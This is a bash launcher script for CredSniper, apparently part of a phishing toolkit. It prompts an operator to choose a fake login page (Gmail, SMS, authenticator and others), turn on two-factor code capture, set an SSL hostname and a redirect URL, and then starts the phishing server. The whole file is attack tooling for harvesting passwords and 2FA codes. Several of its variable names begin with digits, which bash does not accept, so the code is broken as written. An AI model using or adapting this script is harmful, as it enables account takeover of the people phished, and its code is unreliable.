#!/bin/bash
ORNG='\033[0;33m'
NC='\033[0m'
W='\033[1;37m'
LP='\033[1;35m'
YLW='\033[1;33m'
LBBLUE='\e[104m'
1='gmail'
2='error'
3='login'
4='password'
5='authenticator'
6='sms'
7='touchscreen'
HOSTOPT=''
# CredSniper Options Selections
cred_opts(){
  echo -e "${W}Please choose the module to use${NC}"
  echo -e "${YLW}1 = Gmail"
  echo -e "2 = Error"
  echo -e "3 = Login"
  echo -e "4 = Password"
  echo -e "5 = Authenticator"
  echo -e "6 = Sms"
  echo -e "7 = Touchscreen"
  echo -e "${LP}Gmail works best${NC}"
  read MODULE
  echo -e "${W}Would you like to enable 2 Factor Authentication?(y/n)${NC}"
  read 2FA_ANS
  if [[ ${2FA_ANS} == "y" ]]; then
    2FA='--twofactor'
  else
    2FA=''
  fi
  echo -e "${W}Would you like to enable SSL?(y/n)${NC}"
  read EN_SSL
  if [[ ${EN_SSL} == "y" ]]; then
    SSL='--ssl'
    PORT='443'
    echo -e "${W}Please enter the hostname to be used for SSL${NC}"
    read HOSTNAME
    HOSTOPT="--hostname ${HOSTNAME}"
  else
    SSL=''
    PORT='80'
  fi
  echo -e "${W}Please enter the final URL for target to be redirected to after phishing${NC}"
  read FURL
}

# CredSniper Start
cd tools/CredSniper
echo -e "${ORNG}"
figlet -f mini "CredSniper"
echo -e "${NC}"
cred_opts
echo -e "${LP}===============================================================================================${NC}"
echo -e "${W}Module: ${YLW}${MODULE}${NC}"
echo -e "${W}2FA Enabled: ${YLW}${2FA_ANS}${NC}"
echo -e "${W}SSL Enabled: ${YLW}${EN_SSL}${NC}"
if [[ ${EN_SSL} == "y" ]]; then
  echo -e "${W}SSL Hostname: ${YLW}${HOSTNAME}${NC}"
else
  echo ""
fi
echo -e "${W}Final Redirection URL: ${YLW}${FURL}${NC}"
echo -e "${W}Are the options above correct?(y/n)${NC}"
read CORRECT
if [[ ${CORRECT} == "n" ]]; then
  cred_opts
else
  echo -e "${YLW}Great! Time to Start Phishing!${NC}"
fi
echo -e "${LP}===============================================================================================${NC}"
source bin/activate
python3 credsniper.py --module ${MODULE} ${2FA} --port ${PORT} --final ${FURL} ${SSL} ${HOSTOPT}

cd ../..
./tigershark
